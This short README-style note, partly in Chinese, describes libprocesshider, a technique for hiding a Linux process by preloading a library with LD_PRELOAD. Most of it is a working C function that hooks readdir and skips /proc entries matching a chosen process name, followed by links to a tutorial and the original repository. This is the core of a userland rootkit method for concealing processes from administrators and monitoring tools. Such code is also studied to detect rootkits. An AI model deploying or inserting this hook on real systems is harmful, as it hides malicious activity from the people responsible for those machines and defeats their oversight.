## libprocesshider
Hide a process under Linux using the ld preloader.

Full tutorial available at https://sysdigcloud.com/hiding-linux-processes-for-fun-and-profit/

通过hook `readdir`实现进程隐藏
```
struct dirent* readdir(DIR *dirp)
{ 
  if(original_##readdir == NULL) {                  
    original_##readdir = dlsym(RTLD_NEXT, #readdir);       
    if(original_##readdir == NULL)                
    {                               
      fprintf(stderr, "Error in dlsym: %s\n", dlerror());     
    }                               
  }                                 
                                    
  struct dirent* dir;                         
                                    
  while(1)                              
  {                                 
    dir = original_##readdir(dirp);                 
    if(dir) {                           
      char dir_name[256];                     
      char process_name[256];                   
      if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&    
        strcmp(dir_name, "/proc") == 0 &&           
        get_process_name(dir->d_name, process_name) &&    
        strcmp(process_name, process_to_filter) == 0) {     
        continue;                       
      }                             
    }                               
    break;                            
  }                                 
  return dir;                             
}
```   
## References
- [libprocesshider](https://github.com/gianlucaborello/libprocesshider)

